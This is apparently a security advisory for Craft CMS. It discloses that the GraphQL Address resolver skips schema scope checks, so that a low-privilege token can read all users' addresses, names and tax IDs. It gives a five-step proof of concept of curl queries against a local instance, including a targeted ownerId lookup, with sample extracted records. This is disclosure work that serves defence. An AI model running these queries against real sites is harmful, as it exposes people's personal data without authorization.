summary: "Craft CMS's Missing Authorization in GraphQL Address Resolver Allows Cross-Scope PII\
  \ Disclosure\n### Summary\n\nThe GraphQL Address element resolver (src/gql/resolvers/elements/Address.php)\
  \ performs no schema scope filtering on top-level queries. A GraphQL API token scoped to a\
  \ single low-privilege user group can read every address in the system, including addresses\
  \ belonging to users in groups the token has no authorization to access. This exposes PII,\
  \ including full names, addresses, organizations, tax IDs, etc.\n\n### Details\n\nEvery GraphQL\
  \ element resolver in Craft CMS applies schema scope filtering via `GqlHelper::extractAllowedEntitiesFromSchema()`\
  \ when handling top-level queries, except the Address resolver.\n\nThe only gate check for\
  \ addresses is `canQueryUsers()` (`src/gql/queries/Address.php`, line 30), which is a binary\
  \ check. It returns `true` if the token has access to *any* user group. Once past this gate,\
  \ no further filtering is applied.\n\n### PoC\n\n**Tested on:** CraftCMS 5.9.17 (fresh Docker\
  \ install, PHP 8.3)\n**Prerequisites:** A GraphQL API token with read access to any single\
  \ user group\n\n### Environment\n\n- Two user groups: `publicUsers` (in token scope) and `internalTeam`\
  \ (NOT in scope)\n- 5 internal executives with corporate addresses (internalTeam)\n- 3 public\
  \ customers with personal addresses (publicUsers)\n- GQL token scoped to `publicUsers:read`\
  \ only\n\n**Step 1:** Introspect the schema to discover the `addresses` query is available\
  \ to this token. Issue the below curl command \n\n```bash\ncurl -s -H \"Authorization: Bearer\
  \ wbzwuzvlfohtahryztgaawyjpctqdvcm\" -H \"Content-Type: application/json\" -d '{\"query\"\
  : \"{ __type(name: \\\"Query\\\") { fields { name description } } }\"}' http://localhost:8080/actions/graphql/api\
  \ | jq\n```\n\n<img width=\"1641\" height=\"856\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d798b4d2-9965-40fd-8252-ba6b08d1dde9\"\
  \ />\n\nThe token can see `addresses`, `entries`, `users` as top-level queries.\n\n**Step\
  \ 2:** Enumerate Address fields to identify PII exposure surface.\n\n```bash\ncurl -s -H \"\
  Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm\" -H \"Content-Type: application/json\"\
  \ -d '{\"query\": \"{ __type(name: \\\"AddressInterface\\\") { fields { name\ntype { name\
  \ } } } }\"}' http://localhost:8080/actions/graphql/api | jq\n```\n\n<img width=\"1726\" height=\"\
  862\" alt=\"image\" src=\"https://github.com/user-attachments/assets/31a90b5d-7337-49b9-8802-355f16b7b4f3\"\
  \ />\n\n> Exposed fields include: `fullName`, `firstName`, `lastName`, `addressLine1/2/3`,\
  \ `locality`, `postalCode`, `countryCode`, `organization`, `organizationTaxId`, `latitude`,\
  \ `longitude`.\n> \n\n**Step 3:** Establish baseline -  confirm the token’s user scope is\
  \ limited. This proves our token only has access to the `publicUsers` group.\n\n```bash\n\
  curl -s -H \"Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm\" -H \"Content-Type: application/json\"\
  \ -d '{\"query\": \"{ addresses { id fullName firstName lastName addressLine1 addressLine2\
  \ locality postalCode countryCode organization\norganizationTaxId } }\"}' http://localhost:8080/actions/graphql/api\
  \ | jq\n```\n\n<img width=\"1626\" height=\"492\" alt=\"image\" src=\"https://github.com/user-attachments/assets/42ec8c3d-d1ae-4eac-9202-af072f394e4a\"\
  \ />\n\nOnly 5 public users returned. Scope enforcement works correctly for the User resolver\
  \ — internal executives are NOT visible.\n\n**Step 4:** Query all addresses - the token returns\
  \ data for ALL user groups, including those outside its authorized scope.\n\n```bash\ncurl\
  \ -s -H \"Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm\" -H \"Content-Type: application/json\"\
  \ -d '{\"query\": \"{ addresses { id fullName firstName lastName addressLine1 addressLine2\
  \ locality postalCode countryCode organization\n  organizationTaxId } }\"}' http://localhost:8080/actions/graphql/api\
  \ | jq\n```\n\n<img width=\"1902\" height=\"910\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ef34e11c-36a8-4582-93e3-04c3e4dad6ab\"\
  \ />\n\n<img width=\"1444\" height=\"942\" alt=\"image\" src=\"https://github.com/user-attachments/assets/64d6edec-60bf-4481-8a20-7f64c81c015b\"\
  \ />\n\n\n ▎ \"This token can only see 5 users, but it returns 10 addresses\" as shown in\
  \ the above 2 screenshot outputs\n\n> **All 10 addresses returned.** The same token that only\
  \ sees 5 public users now returns addresses for internal executives including corporate tax\
  \ IDs:\n> \n> - Sarah Chen, 4200 Executive Plaza Dr, SF — Horizon Dynamics Inc. (TaxID: 82-4917263)\n\
  > - James Whitfield, 89 Kensington High St, London — Whitfield Capital Partners LLP (TaxID:\
  \ GB927461038)\n> - Maria Rossi, 15 Via della Conciliazione, Roma — Rossi & Bianchi Avvocati\
  \ (TaxID: IT04829173651)\n> - David Nakamura, 2-11-3 Meguro, Tokyo — Nakamura Medical Technologies\
  \ KK (TaxID: JP8230-4719-2835)\n> - Elena Voronova, 27 Universitätsstrasse, Zurich — Voronova\
  \ Biotech AG (TaxID: CHE-384.291.057)\n\n---\n\n**Step 5:** Targeted IDOR - extract a specific\
  \ internal user’s address by owner ID.\n\n```bash\ncurl -s -H \"Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm\"\
  \ -H \"Content-Type: application/json\" -d '{\"query\": \"{ addresses(ownerId: [3]) { fullName\
  \ addressLine1 addressLine2 locality postalCode countryCode organization\n  organizationTaxId\
  \ } }\"}' http://localhost:8080/actions/graphql/api | jq\n```\n\n<img width=\"1902\" height=\"\
  365\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b7c6d5cf-295a-433a-a76c-2b69815968cd\"\
  \ />\n\n> Directly extracts a specific internal team member’s address: “Secret Admin”, 1 Secret\
  \ Government Facility, Suite 007, Langley 22101 — SecretCorp LLC (TaxID: 98-7654321). The\
  \ token has zero authorization to access this user’s data.\n\n## Impact \n\n### Who is Impacted\n\
  \nAny Craft CMS Pro site (v4.0.0+) that uses GraphQL API tokens with user group scoping and\
  \ stores user addresses. This is the standard deployment pattern for headless CMS sites using\
  \ frameworks such as Next.js, Nuxt.js, or Gatsby. An attacker with any valid GraphQL token\
  \ that has access to at least one user group can extract all addresses in the system, regardless\
  \ of scope restrictions.\n\n### Risk\n\n- Direct threat to installation data: Any GraphQL\
  \ API token with access to any single user group can extract all address systems-wide, including\
  \ names, home addresses, organizations, and tax IDs belonging to users in restricted groups.\n\
  \n- Targeted extraction via IDOR: The `ownerId` argument allows an attacker to extract specific\
  \ users’ addresses by ID, enabling targeted reconnaissance against administrators or high-value\
  \ users without any brute-force or elevated access.\n\n- Scope boundary failure: Craft CMS’s\
  \ GraphQL schema scoping system is the primary security mechanism for controlling API access.\
  \ Every other element resolver (Entry, User, Asset, Category, Tag) enforces this boundary.\
  \ The Address resolver does not, making this a foundational gap in Craft’s native authorization\
  \ model and not a site-specific configuration issue.\n\n- Affects all installations using\
  \ GraphQL with user groups: Any Craft CMS Pro site that exposes a scoped GraphQL token and\
  \ stores addresses is affected. This is the standard headless CMS deployment pattern, not\
  \ an edge case.\n\n## AI Disclosure\n\nThis vulnerability was identified through manual source\
  \ code review with AI-assisted analysis (Claude). The initial pattern deviation (Address resolver\
  \ missing scope filtering while all other resolvers have it) was identified through manual\
  \ comparison of resolver implementations. AI was used to assist with code navigation, PoC\
  \ scripting, and report drafting. \n\nAll findings were verified against a local Docker instance\
  \ of Craft CMS 5.9.17.\n\n## Resources\n\nhttps://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128"
